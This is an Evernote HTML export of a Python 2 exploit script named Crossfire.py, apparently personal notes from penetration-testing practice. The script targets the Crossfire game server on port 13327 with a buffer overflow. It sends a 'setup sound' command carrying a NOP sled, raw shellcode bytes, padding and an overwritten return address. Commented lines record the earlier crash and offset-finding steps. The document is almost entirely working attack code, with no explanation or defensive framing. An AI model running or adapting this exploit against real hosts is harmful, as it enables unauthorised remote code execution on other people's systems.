<html>
<head>
  <title>Crossfire.py</title>
  <basefont face="Tahoma" size="2" />
  <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
  <meta name="exporter-version" content="Evernote Windows/271108 (en-US); Windows/6.1.7601 Service Pack 1;"/>
  <style>
    body, td {
      font-family: Tahoma;
      font-size: 10pt;
    }
  </style>
</head>
<body>
<a name="838"/>
<h1>Crossfire.py</h1>

<div>
<div style="word-wrap: break-word; -webkit-nbsp-mode: space; -webkit-line-break: after-white-space;">
#!/usr/bin/python
<div>import socket, sys</div>
<div>host = sys.argv[1]</div>
<div># crash=&quot;\x41&quot; * 4379</div>
<div><br/></div>
<div># crash = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4$</div>
<div><br/></div>
<div># crash = &quot;\x41&quot; * 4368 + &quot;\x42\x42\x42\x42&quot; + &quot;\x43&quot; * 7</div>
<div><br/></div>
<div><br/></div>
<div># b7dacad6 address in nop slide just before shellcode in eax</div>
<div><br/></div>
<div>shellcode2 = (&quot;\xbe\x4e\x69\xc6\xf3\xda\xd5\xd9\x74\x24\xf4\x5b\x29\xc9&quot; +</div>
<div>&quot;\xb1\x14\x31\x73\x14\x83\xc3\x04\x03\x73\x10\xac\x9c\xf7&quot; +</div>
<div>&quot;\x28\xc7\xbc\xab\x8d\x74\x29\x4e\x9b\x9b\x1d\x28\x56\xdb&quot; +</div>
<div>&quot;\x05\xeb\x3a\xb3\xbb\x13\xaa\x1f\xd6\x03\x9d\xcf\xaf\xc5&quot; +</div>
<div>&quot;\x77\x89\xf7\xc8\x08\xdc\x49\xd7\xbb\xda\xf9\xb1\x76\x62&quot; +</div>
<div>&quot;\xba\x8d\xef\xaf\xbd\x7d\xb6\x45\x81\xd9\x84\x19\xb4\xa0&quot; +</div>
<div>&quot;\xee\x71\x68\x7c\x7c\xe9\x1e\xad\xe0\x80\xb0\x38\x07\x02&quot; +</div>
<div>&quot;\x1e\xb2\x29\x12\xab\x09\x29&quot;)</div>
<div><br/></div>
<div><br/></div>
<div><br/></div>
<div>crash=&quot;\x90&quot;*200 + shellcode2 + &quot;\x43&quot; * 4063 + &quot;\xD6\xCA\xDA\xB7&quot; +&quot;D&quot;*7</div>
<div># crash=&quot;\x90&quot;*200 + shellcode1 + &quot;\x43&quot; * 4090 + &quot;\x42\x42\x42\x42&quot; +&quot;D&quot;*7</div>
<div># crash=&quot;\x90&quot;*200 + &quot;\x41&quot;*728 + &quot;\x43&quot; * 3440 + &quot;\x42\x42\x42\x42&quot; +&quot;D&quot;*7</div>
<div># crash=&quot;\x90&quot;*200 + shellcode + &quot;\x43&quot; * 3440 + &quot;\x42\x42\x42\x42&quot; +&quot;D&quot;*7</div>
<div><br/></div>
<div>buffer = &quot;\x11(setup sound &quot; + crash + &quot;\x90\x00#&quot;</div>
<div>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div>
<div>print &quot;[*]Sending evil buffer...&quot;</div>
<div>s.connect((host, 13327))</div>
<div>data=s.recv(1024)</div>
<div>print data</div>
<div>s.send(buffer)</div>
<div>s.close()</div>
<div>print &quot;[*]Payload Sent !&quot;</div>
<div><br/></div>
</div>
</div></body></html> 